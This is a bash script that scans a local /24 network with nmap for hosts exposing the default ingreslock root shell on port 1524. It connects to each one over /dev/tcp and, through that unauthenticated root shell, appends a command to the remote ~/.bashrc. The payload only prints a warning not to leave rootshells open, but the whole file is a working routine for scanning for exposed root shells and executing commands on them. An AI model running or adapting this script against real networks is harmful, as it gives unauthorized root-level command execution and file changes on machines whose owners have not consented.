#!/bin/bash
echomessage='Hello,'
rootshellcommand='echo "Hello, Please dont leave default rootshells open"'
network='192.168.0.0/24'
port='1524' #default (vulnerable) Ingres service

nmap --script=banner $network -p $port | grep "open" -B 4 -A 1 | grep '192' | awk -v OFS="\n" '{ print $5 }' > outputtmp.txt
linenumber=$(wc -l outputtmp.txt | awk '{ print $1 }')
for x in `seq 1 "$linenumber"`
do
        var=$(sed "${x}q;d" outputtmp.txt)
        exec 3<>/dev/tcp/$var/1524;
        header=$(head -n 1 <&3 | awk '{ print $1 }')
        if [ $header = $echomessage ]
        then
           echo "$var: Skipped, message already added"
        else
           echo "$var:$port - default metasploit root shell found, message added"
           exec 5<>/dev/tcp/$var/1524;
           echo "echo '$rootshellcommand' >> ~/.bashrc" >&5

        fi
done